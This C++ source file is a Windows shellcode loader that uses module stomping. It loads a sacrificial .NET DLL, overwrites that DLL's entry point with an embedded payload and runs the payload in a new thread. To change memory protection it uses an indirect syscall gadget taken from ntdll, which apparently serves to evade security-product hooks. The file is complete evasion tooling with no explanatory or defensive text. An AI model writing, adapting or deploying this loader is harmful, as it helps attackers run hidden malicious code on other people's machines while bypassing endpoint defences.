#include <windows.h>
#include <stdio.h>
#include "payload.h"

#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

extern "C" NTSTATUS NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect, PVOID SyscallGadget);

static PVOID FindGadget(PBYTE base, DWORD size, BYTE b0, BYTE b1, BYTE b2) {
    for (PBYTE cur = base; cur <= base + size - 3; cur++) {
        if (cur[0] == b0 && cur[1] == b1 && cur[2] == b2) return cur;
    }
    return NULL;
}

static BOOL ProtectMem(PVOID addr, SIZE_T size, ULONG prot, PULONG oldProt, PVOID gadget) {
    if (gadget) {
        PVOID base = addr;
        SIZE_T region = size;
        NTSTATUS s = NtProtectVirtualMemory_Indirect(
            GetCurrentProcess(), &base, &region, prot, oldProt, gadget);
        if (s == 0) return TRUE;
    }
    return VirtualProtect(addr, size, prot, (PDWORD)oldProt);
}

int main() {
    // Find syscall gadget in ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PBYTE ntBase = NULL; DWORD ntSize = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            ntBase = (PBYTE)hNtdll + sec[i].VirtualAddress;
            ntSize = sec[i].Misc.VirtualSize;
            break;
        }
    }
    PVOID syscallGadget = ntBase ? FindGadget(ntBase, ntSize, 0x0F, 0x05, 0xC3) : NULL;

    // Load sacrificial DLL
    HMODULE hMod = LoadLibraryW(STOMP_DLL_PATH);
    if (!hMod) return 1;
    DisableThreadLibraryCalls(hMod);

    // Find entry point and .text section
    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dh->e_lfanew);
    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nh);

    DWORD epRVA = nh->OptionalHeader.AddressOfEntryPoint;
    LPVOID ep = (LPVOID)((BYTE*)hMod + epRVA);

    DWORD textVA = 0, textSize = 0;
    for (int i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sh[i].Name, ".text") == 0) {
            textVA = sh[i].VirtualAddress;
            textSize = sh[i].Misc.VirtualSize;
            break;
        }
    }

    DWORD avail = textSize - (epRVA - textVA);
    if (embedded_payload_size > avail) return 1;

    // Stomp
    ULONG oldProt = 0;
    if (!ProtectMem(ep, embedded_payload_size, PAGE_READWRITE, &oldProt, syscallGadget)) return 1;
    memcpy(ep, embedded_payload, embedded_payload_size);
    ULONG tmp = 0;
    ProtectMem(ep, embedded_payload_size, oldProt ? oldProt : PAGE_EXECUTE_READ, &tmp, syscallGadget);

    // Execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
    if (!hThread) return 1;
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
